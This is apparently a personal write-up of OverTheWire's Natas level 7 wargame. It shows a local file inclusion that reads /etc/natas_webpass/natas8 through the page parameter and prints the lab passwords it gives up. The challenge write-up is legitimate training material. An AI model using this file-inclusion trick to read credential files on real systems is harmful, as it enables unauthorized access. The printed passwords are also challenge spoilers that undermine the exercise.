# Natas Level 6 → Level 7
## Problem Description
Username: natas7 <br>
URL: http://natas7.natas.labs.overthewire.org
## Approach

```
siddharth@siddharth-pc:~$ curl 'http://natas7.natas.labs.overthewire.org/index.php?/etc/natas_webpass/natas8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Authorization: Basic bmF0YXM3OmpteFNpSDNTUDZTb25mOGR2NjZuZzh2MWNJRWRqWFdy' -H 'Connection: keep-alive' -H 'Cookie: __utma=176859643.203424577.1663008070.1663008070.1663062912.2; __utmz=176859643.1663008070.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=176859643.4.10.1663062912; __utmc=176859643' -H 'Upgrade-Insecure-Requests: 1' --compressed
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>

```

Visiting http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 I got the password.
## Password
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 
